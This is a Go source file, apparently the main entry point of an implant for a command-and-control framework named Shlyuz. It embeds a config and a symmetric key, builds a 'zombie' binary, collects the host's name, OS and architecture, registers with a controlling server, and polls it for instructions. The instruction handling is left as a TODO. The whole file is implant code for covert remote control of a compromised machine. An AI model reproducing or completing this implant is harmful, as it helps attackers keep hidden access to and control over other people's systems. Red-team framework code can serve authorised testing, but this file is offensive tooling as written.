package main

import (
	"embed"
	"log"
	"sync"
	"time"

	"shlyuz/pkg/component"
	"shlyuz/pkg/config"
	"shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/instructions"
	"shlyuz/pkg/transaction"
	"shlyuz/pkg/transport"
	"shlyuz/pkg/utils/logging"
	"shlyuz/pkg/utils/uname"
)

// embeded config
//
//go:generate cp -r ../../configs/shlyuz.conf ./shlyuz.conf
//go:generate cp -r ../../configs/symkey ./symkey
//go:generate go build -o zombie ../../internal/zombie/pkg/zombie.go
//go:embed *
var configFs embed.FS

type interactionCounter struct {
	mu sync.Mutex
	v  component.Component
	t  transport.TransportMethod
}

// Initalizes the implant, reads the config, sets the values, initalizes the keys, etc
func genComponentInfo() component.Component {
	var YadroComponent component.Component
	var err error
	log.SetPrefix(logging.GetLogPrefix())
	log.Println("Started Shlyuz")
	rawConfig, err := configFs.ReadFile("shlyuz.conf")
	if err != nil {
		log.Fatalln("failed to get embedded config")
	}
	symKey, err := configFs.ReadFile("symkey")
	if err != nil {
		log.Fatalln("failed to retrieve symkey")
	}
	// componentConfig := config.ReadConfig(rawConfig, YadroComponent.XorKey, symKey)
	componentConfig := config.ReadPlaintextConfig(rawConfig, symKey) // debug
	parsedConfig := config.ParseConfig(componentConfig.Message)
	YadroComponent.Config.Id = parsedConfig.Id
	YadroComponent.ComponentId = YadroComponent.Config.Id
	YadroComponent.Config.TransportName = parsedConfig.TransportName
	YadroComponent.Config.InitSignature = parsedConfig.InitSignature
	YadroComponent.Config.TskChkTimer = parsedConfig.TskChkTimer
	YadroComponent.Config.CryptoConfig = parsedConfig.CryptoConfig
	YadroComponent.InitalKeypair = YadroComponent.Config.CryptoConfig.CompKeyPair
	YadroComponent.InitalRemotePubkey = parsedConfig.CryptoConfig.PeerPk
	YadroComponent.ConfigKey = componentConfig.Key
	YadroComponent.Manifest = makeManifest(YadroComponent.Config.Id)

	return YadroComponent
}

func makeManifest(componentId string) component.ComponentManifest {
	var generatedManifest component.ComponentManifest
	platInfo := uname.GetUname()
	generatedManifest.Hostname = platInfo.Uname.Nodename
	generatedManifest.Id = componentId
	generatedManifest.Os = platInfo.Uname.Sysname
	generatedManifest.Arch = platInfo.Uname.Machine
	return generatedManifest
}

func main() {
	Component := genComponentInfo()
	transportWg := sync.WaitGroup{}
	defer transportWg.Wait()
	transport, _, err := transport.PrepareTransport(&Component, []string{})
	if err != nil {
		log.Fatalln("transport failed to initalize: ", err)
	}

	initFrame := transaction.GenerateInitFrame(Component)
	transaction.RelayInitFrame(&Component, initFrame, transport)
	serverReg, boolSuccess := transaction.RetrieveInitFrame(&Component, transport)
	if !boolSuccess {
		log.Println("server registration failed")
	}
	// TODO: Register LP here
	log.Println(serverReg)

	// TODO: Implement loop here to do the actual stuff
	//  first we send a request for a command, then we retrieve a response
	for {
		var instructionRequestFrame instructions.InstructionFrame
		var newKeyPair asymmetric.AsymmetricKeyPair
		instructionRequestFrame, newKeyPair = transaction.RequestInstruction(&serverReg)
		transaction.RelayInstructionFrame(&serverReg, instructionRequestFrame)
		serverReg.CurKeyPair = newKeyPair
		instructionFrame, err := transaction.RetrieveInstruction(&serverReg)
		log.Println(instructionFrame) // debug
		if err != nil {
			log.Println("invalid instruction received: ")
			log.Println(err)
			time.Sleep(time.Duration(Component.Config.TskChkTimer))
			break
		}
		// TODO: Process instruction
		time.Sleep(time.Duration(Component.Config.TskChkTimer))
		break
	}
}
